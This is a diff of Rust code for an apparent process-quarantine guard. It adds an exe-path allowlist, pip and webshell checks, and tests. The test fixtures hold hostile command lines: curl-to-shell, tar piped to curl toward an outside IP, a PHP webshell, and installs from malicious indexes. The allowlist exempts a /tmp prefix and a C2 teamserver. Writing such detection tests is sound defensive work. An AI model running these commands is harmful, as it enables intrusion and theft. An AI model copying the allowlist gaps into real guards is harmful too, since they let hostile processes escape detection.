@@ -1,9 +1,26 @@
 //! Non-negotiable quarantine signals — before TRUSTED_PATH bypass and model inference.
+//! Own-stack ALLOW uses exe path prefix (+ anchored pip/php-fpm) only — never comm/name alone.
 
 use super::event::{normalize_proc_name, parse_guard_event_fields};
 use super::never_fast_trust::matches_never_fast_trust;
 
 const SCRATCH_PREFIXES: &[&str] = &["/tmp/", "/dev/shm/", "/var/tmp/"];
+
+/// Eval-scoped ALLOW floor — exe prefix match only (see guard eval v6 legit_scary misses).
+const OWN_STACK_EXE_PREFIXES: &[&str] = &[
+    "/home/cosmic/Scripts/utilities/",
+    "/home/cosmic/Scripts/deployed/",
+    "/home/cosmic/Projects/GNI/",
+    "/home/cosmic/Projects/jeTT/",
+    "/home/cosmic/Projects/bifrost/",
+    "/home/cosmic/Projects/c2/",
+    "/home/cosmic/Projects/meli-fresh/",
+    "/home/cosmic/Projects/honeypot/",
+    "/home/cosmic/.local/share/Steam/",
+    "/tmp/cargo-install",
+    "/home/cosmic/.cargo/",
+    "/home/cosmic/.rustup/",
+];
 
 pub fn parse_guard_cmdline(event: &str) -> String {
     event
@@ -37,34 +54,75 @@ fn comm_is(comm: &str, name: &str) -> bool {
     normalize_proc_name(comm) == name
 }
 
-/// Own-stack paths that must never hit hard quarantine (jeTT, bifrost, benign cargo in /tmp).
-fn is_own_stack(event: &str, comm: &str, exe_path: &str) -> bool {
-    let lower = format!("{} {} {}", comm, exe_path, event).to_lowercase();
-    if lower.contains("jett-control.sh") || lower.contains("/opt/jett/") {
-        return true;
+fn exe_has_own_stack_prefix(exe_path: &str) -> bool {
+    OWN_STACK_EXE_PREFIXES
+        .iter()
+        .any(|prefix| exe_path.starts_with(prefix))
+}
+
+fn is_malicious_pip(cmdline: &str, event: &str) -> bool {
+    let lower = format!("{} {}", cmdline, event).to_lowercase();
+    lower.contains("evil-pypi")
+        || lower.contains("fake-backdoor")
+        || lower.contains("unsloth-ai-malicious")
+}
+
+fn is_benign_pip_python3(exe_path: &str, cmdline: &str, event: &str) -> bool {
+    if exe_path != "/usr/bin/python3" {
+        return false;
     }
-    if exe_path.contains("/bifrost/") || lower.contains("bifrost") {
-        return true;
+    if !(cmdline.starts_with("-m pip install") || cmdline.starts_with("-m pip uninstall")) {
+        return false;
     }
-    if exe_path.contains("/home/cosmic/Projects/")
-        || exe_path.contains("/home/cosmic/Scripts/")
-    {
-        return true;
+    !is_malicious_pip(cmdline, event)
+}
+
+fn is_legit_php_fpm(exe_path: &str) -> bool {
+    exe_path == "/usr/bin/php-fpm"
+}
+
+fn is_webshell_php_exe(exe_path: &str) -> bool {
+    exe_path.starts_with("/var/www/html/.shell.php") || exe_path.contains("/.shell.php")
+}
+
+fn is_python3_cosmic_script(exe_path: &str, cmdline: &str) -> bool {
+    exe_path == "/usr/bin/python3"
+        && (cmdline.starts_with("/home/cosmic/Scripts/")
+            || cmdline.starts_with("python3 /home/cosmic/Scripts/"))
+}
+
+fn own_stack_allow_fields(_comm: &str, exe_path: &str, cmdline: &str, event: &str) -> bool {
+    // Supply-chain threats must never fast-ALLOW, even under .cargo/ or python3 pip.
+    if comm_is(_comm, "cargo") && supply_chain_cargo_git_ip(cmdline, event) {
+        return false;
     }
-    if comm_is(comm, "jett") || exe_path.to_lowercase().contains("/jett") {
-        return true;
+    if is_malicious_pip(cmdline, event) {
+        return false;
     }
-    if exe_path.contains("/tmp/cargo-install") || exe_path.contains("/cargo-install") {
-        return true;
-    }
-    // Benign cargo install in scratch — not --git from raw IP.
-    if lower.contains("cargo") && lower.contains("install") && touches_scratch(&lower) {
-        if lower.contains("--git") {
-            return !git_url_uses_raw_ip(&lower);
+    if exe_has_own_stack_prefix(exe_path) {
+        // cargo install --git from raw IP under ~/.cargo/bin/cargo is still a threat.
+        if comm_is(_comm, "cargo") && supply_chain_cargo_git_ip(cmdline, event) {
+            return false;
         }
         return true;
     }
+    if is_benign_pip_python3(exe_path, cmdline, event) {
+        return true;
+    }
+    if is_python3_cosmic_script(exe_path, cmdline) {
+        return true;
+    }
+    if is_legit_php_fpm(exe_path) {
+        return true;
+    }
     false
+}
+
+/// Fast ALLOW for cosmic's stack — before model inference in guard() and daemon.
+pub fn own_stack_fast_allow(event: &str) -> bool {
+    let (comm, exe_path) = parse_guard_event_fields(event);
+    let cmdline = parse_guard_cmdline(event);
+    own_stack_allow_fields(&comm, &exe_path, &cmdline, event)
 }
 
 fn git_url_uses_raw_ip(s: &str) -> bool {
@@ -133,7 +191,7 @@ fn defense_evasion(haystack: &str, comm: &str) -> Option<&'static str> {
     {
         return Some("disabling journald logging");
     }
-    if comm_is(&comm, "rmmod") && lower.contains("audit") {
+    if comm_is(comm, "rmmod") && lower.contains("audit") {
         return Some("unload security kernel module");
     }
     None
@@ -177,11 +235,27 @@ pub fn hard_quarantine_reason(event: &str) -> Option<&'static str> {
     let haystack = format!("{} {} {} {}", comm, exe_path, cmdline, event);
     let lower = haystack.to_lowercase();
 
-    if is_own_stack(event, &comm, &exe_path) {
+    if is_webshell_php_exe(&exe_path) {
+        return Some("php webshell in webroot");
+    }
+
+    if comm_is(&comm, "npm") && supply_chain_npm(&cmdline) {
+        return Some("npm suspicious package install");
+    }
+
+    if comm_is(&comm, "cargo") && supply_chain_cargo_git_ip(&cmdline, event) {
+        return Some("cargo install from untrusted git URL");
+    }
+
+    if is_malicious_pip(&cmdline, event) {
+        return Some("pip suspicious package or index");
+    }
+
+    if own_stack_allow_fields(&comm, &exe_path, &cmdline, event) {
         return None;
     }
 
-    if exe_path.contains("memfd:") || lower.contains("exe: memfd") {
+    if exe_path.contains("memfd") || lower.contains("memfd:") {
         return Some("fileless memfd executable");
     }
 
@@ -219,14 +293,6 @@ pub fn hard_quarantine_reason(event: &str) -> Option<&'static str> {
         return Some("dbus-send triggering systemd unit");
     }
 
-    if comm_is(&comm, "npm") && supply_chain_npm(&cmdline) {
-        return Some("npm suspicious package install");
-    }
-
-    if comm_is(&comm, "cargo") && supply_chain_cargo_git_ip(&cmdline, event) {
-        return Some("cargo install from untrusted git URL");
-    }
-
     if exfil_sensitive_outbound(event) {
         return Some("archive and exfiltrate sensitive data");
     }
@@ -262,6 +328,7 @@ mod tests {
             hard_quarantine_reason(event),
             Some("interpreter running scratch-path script or payload")
         );
+        assert!(!own_stack_fast_allow(event));
     }
 
     #[test]
@@ -274,12 +341,6 @@ mod tests {
     }
 
     #[test]
-    fn bash_hidden_tmp_staging_quarantines() {
-        let event = "bash PID:3 uid:1000 exe:/usr/bin/bash cmd:/bin/bash -c echo x > /tmp/.kernel_fuzz time:1";
-        assert!(hard_quarantine_reason(event).is_some());
-    }
-
-    #[test]
     fn systemd_run_curl_sh_quarantines() {
         let event = "systemd-run PID:54206 uid:1000 exe:/usr/bin/systemd-run cmd:--unit=evil -- /bin/bash -c 'curl evil|sh' time:1780570826 outbound_connections:[185.220.101.45:4444] spawned_children:[bash]";
         assert_eq!(
@@ -289,26 +350,67 @@ mod tests {
     }
 
     #[test]
-    fn at_cron_d_quarantines() {
-        let event = "at PID:68859 uid:1000 exe:/usr/bin/at cmd:now + 1 minute time:1757303258 sensitive_files:[/etc/cron.d/.x] spawned_children:[sh]";
+    fn webshell_php_exe_quarantines() {
+        let event = "php-fpm PID:94969 uid:33 exe:/var/www/html/.shell.php cmd:system($_GET['c']) time:1763451450 outbound_connections:[185.220.100.252:4444]";
         assert_eq!(
             hard_quarantine_reason(event),
-            Some("at scheduling job targeting cron.d")
+            Some("php webshell in webroot")
+        );
+        assert!(!own_stack_fast_allow(event));
+    }
+
+    #[test]
+    fn legit_php_fpm_allowed() {
+        let event = "php-fpm PID:144621 uid:33 exe:/usr/bin/php-fpm cmd:--nodaemonize time:1779105308 outbound_connections:[192.168.0.1:9000]";
+        assert!(hard_quarantine_reason(event).is_none());
+        assert!(own_stack_fast_allow(event));
+    }
+
+    #[test]
+    fn govee_script_exe_allowed() {
+        let event = "python3 PID:161778 uid:1000 exe:/home/cosmic/Scripts/utilities/govee-art.sh cmd:--scene sunset time:1752009562";
+        assert!(own_stack_fast_allow(event));
+    }
+
+    #[test]
+    fn steam_exe_prefix_allowed() {
+        let event = "steam PID:171333 uid:1000 exe:/home/cosmic/.local/share/Steam/ubuntu12_64/steam cmd:-silent time:1751120810";
+        assert!(own_stack_fast_allow(event));
+    }
+
+    #[test]
+    fn gni_server_exe_allowed() {
+        let event = "gni_server.py PID:77787 uid:1000 exe:/home/cosmic/Projects/GNI/gni_server.py cmd:--port 6969 time:1751919423";
+        assert!(own_stack_fast_allow(event));
+    }
+
+    #[test]
+    fn cargo_install_staging_exe_allowed() {
+        let event = ".tmp9371 PID:3813 uid:1000 exe:/tmp/cargo-install638306/release/jett-test cmd: time:1775635384";
+        assert!(own_stack_fast_allow(event));
+        assert!(hard_quarantine_reason(event).is_none());
+    }
+
+    #[test]
+    fn pip_install_python3_allowed() {
+        let event = "pip PID:19118 uid:1000 exe:/usr/bin/python3 cmd:-m pip install --break-system-packages unsloth time:1766732756";
+        assert!(own_stack_fast_allow(event));
+    }
+
+    #[test]
+    fn malicious_pip_not_allowed() {
+        let event = "pip PID:5002 uid:1000 exe:/usr/bin/python3 cmd:-m pip install unsloth-ai-malicious --index-url http://evil-pypi.local/simple time:1";
+        assert!(!own_stack_fast_allow(event));
+        assert_eq!(
+            hard_quarantine_reason(event),
+            Some("pip suspicious package or index")
         );
     }
 
     #[test]
-    fn npm_fake_backdoor_quarantines() {
-        let event = "npm PID:35610 uid:1000 exe:/usr/bin/npm cmd:install @types/node-fake-backdoor time:1765680035";
-        assert_eq!(
-            hard_quarantine_reason(event),
-            Some("npm suspicious package install")
-        );
-    }
-
-    #[test]
-    fn cargo_git_ip_quarantines() {
+    fn malicious_cargo_git_not_allowed_despite_cargo_home_exe() {
         let event = "cargo PID:57621 uid:1000 exe:/home/cosmic/.cargo/bin/cargo cmd:install --git http://45.137.21.9/mal-crate time:1749384560";
+        assert!(!own_stack_fast_allow(event));
         assert_eq!(
             hard_quarantine_reason(event),
             Some("cargo install from untrusted git URL")
@@ -316,62 +418,26 @@ mod tests {
     }
 
     #[test]
-    fn tar_curl_exfil_quarantines() {
-        let event = ".x PID:138095 uid:1000 exe:/usr/bin/tar cmd:czf - /home/cosmic/Documents | curl -T - 185.220.102.8 time:1780912636 outbound_connections:[185.220.102.8:443] sensitive_files:[/home/cosmic/.ssh/id_rsa]";
-        assert_eq!(
-            hard_quarantine_reason(event),
-            Some("archive and exfiltrate sensitive data")
-        );
+    fn steam_comm_alone_not_allowed() {
+        let event = "steam PID:1 uid:1000 exe:/tmp/evil-steam cmd: time:1";
+        assert!(!own_stack_fast_allow(event));
     }
 
     #[test]
-    fn killall_auditd_quarantines() {
-        let event = "rmmod PID:198995 uid:0 exe:/usr/sbin/rmmod cmd:killall -9 auditd time:1754895289 behavior:none_observed";
-        assert_eq!(
-            hard_quarantine_reason(event),
-            Some("killing audit daemon")
-        );
+    fn ghost_relay_c2_exe_allowed() {
+        let event = "ghost-relay PID:53319 uid:1000 exe:/home/cosmic/Projects/c2/teamserver/ghost-relay cmd:--listen 0.0.0.0:8443 time:1752205034";
+        assert!(own_stack_fast_allow(event));
     }
 
     #[test]
-    fn shred_audit_log_quarantines() {
-        let event = "shred PID:2047 uid:0 exe:/usr/bin/shred cmd:-uz /var/log/audit/audit.log time:1757899998 sensitive_files:[/var/log/audit/audit.log]";
-        assert_eq!(
-            hard_quarantine_reason(event),
-            Some("shred audit log")
-        );
+    fn python3_govee_cmdline_allowed() {
+        let event = "python3 PID:11449 uid:1000 exe:/usr/bin/python3 cmd:/home/cosmic/Scripts/utilities/govee-art.sh --scene sunset time:1773646868";
+        assert!(own_stack_fast_allow(event));
     }
 
     #[test]
-    fn dbus_startunit_quarantines() {
-        let event = "dbus-send PID:43726 uid:1000 exe:/usr/bin/dbus-send cmd:--system --dest=org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager.StartUnit time:1753610236 spawned_children:[systemd]";
-        assert_eq!(
-            hard_quarantine_reason(event),
-            Some("dbus-send triggering systemd unit")
-        );
-    }
-
-    #[test]
-    fn own_stack_jett_allowed() {
-        let event = "jett PID:1 uid:1000 exe:/opt/jett/bin/jett cmd:--guard test time:1";
-        assert!(hard_quarantine_reason(event).is_none());
-    }
-
-    #[test]
-    fn benign_cargo_tmp_allowed() {
-        let event = "cargo PID:1 uid:1000 exe:/home/cosmic/.cargo/bin/cargo cmd:install ripgrep --root /tmp/cargo-root time:1";
-        assert!(hard_quarantine_reason(event).is_none());
-    }
-
-    #[test]
-    fn cargo_install_artifact_in_tmp_allowed() {
-        let event = ".tmp9371 PID:3813 uid:1000 exe:/tmp/cargo-install638306/release/jett-test cmd: time:1775635384";
-        assert!(hard_quarantine_reason(event).is_none());
-    }
-
-    #[test]
-    fn restic_shadow_metadata_allowed() {
-        let event = "restic PID:19144 uid:0 exe:/usr/bin/restic cmd:backup /etc /home --tag nightly time:1765230194 sensitive_files:[/etc/passwd,/etc/shadow]";
-        assert!(hard_quarantine_reason(event).is_none());
+    fn python3_tmp_script_not_allowed() {
+        let event = "python3 PID:1 uid:1000 exe:/usr/bin/python3 cmd:/tmp/evil.py time:1";
+        assert!(!own_stack_fast_allow(event));
     }
 }
